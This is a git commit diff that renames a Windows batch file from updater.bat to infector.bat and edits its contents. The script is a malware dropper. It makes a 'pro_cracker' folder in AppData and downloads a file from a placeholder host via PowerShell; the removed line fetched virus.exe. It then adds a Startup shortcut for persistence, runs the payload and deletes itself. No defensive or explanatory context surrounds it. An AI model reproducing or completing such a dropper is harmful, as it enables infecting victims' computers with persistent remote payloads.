ef10842a5a54e6c40ba4a1ab56ddf8efd6749a92
thk34 <103599660+thk34@users.noreply.github.com>
2023-03-26 19:56:43 +0200

    Update and rename updater.bat to infector.bat

--- infector.bat
+++ infector.bat
@@ -1,6 +1,6 @@
 @echo off
 md "%APPDATA%\pro_cracker"
-powershell -command "Invoke-WebRequest -Uri 'http://example.com/virus_folders/* or http://example.com/virus.exe' -OutFile '%APPDATA%\pro_cracker\*'"
+powershell -command "Invoke-WebRequest -Uri 'http://your-website.com/updater.bat' -OutFile '%APPDATA%\pro_cracker\updater.bat'"
 powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk');$s.TargetPath='%APPDATA%\pro_cracker\updater.bat';$s.Save()"
-move "%~f0" "%APPDATA%\pro_cracker"
 call "%APPDATA%\pro_cracker\updater.bat"
+del "%~f0"
